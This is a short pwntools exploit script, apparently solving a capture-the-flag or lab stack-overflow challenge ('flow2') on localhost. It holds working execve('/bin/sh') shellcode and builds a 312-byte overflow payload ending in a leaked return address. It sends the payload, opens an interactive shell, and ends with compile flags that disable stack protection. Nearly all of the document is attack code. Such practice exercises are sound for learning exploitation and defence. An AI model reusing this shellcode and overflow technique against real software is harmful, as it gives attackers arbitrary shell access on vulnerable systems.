from pwn import *
from pwn import p64


def solve():
    # context.binary = ELF('./flow2')
    # p = process()
    p = remote("localhost", 2002)
    p.recvuntil(b'0x')
    addr = int(p.recvline().decode('utf-8'),16)
    print("addr:", addr, hex(addr))
    # my mac cannot load this shellcode
    # payload = asm(shellcraft.sh())          # The shellcode
    payload = b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
    payload = payload.ljust(312, b'A')      # Padding
    payload += p64(addr)                    # Address of the Shellcode
    with open("input.txt","wb") as f:
        f.write(payload)
    log.info(p.clean())
    p.sendline(payload)
    p.interactive()
    p.close()

solve()


"""

```
https://shell-storm.org/shellcode/files/shellcode-841.html


gcc -m32 -fno-stack-protector -z execstack -no-pie -o flow2 flow2.c

AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS

# add the -g in order to add the global debug info
gcc -g -fno-stack-protector -z execstack -no-pie -o flow2 flow2.c
```

OKAY THIS WORKS BUT I NEED TO PERMISSIONS THIS ENVIRONMENT BETTER

"""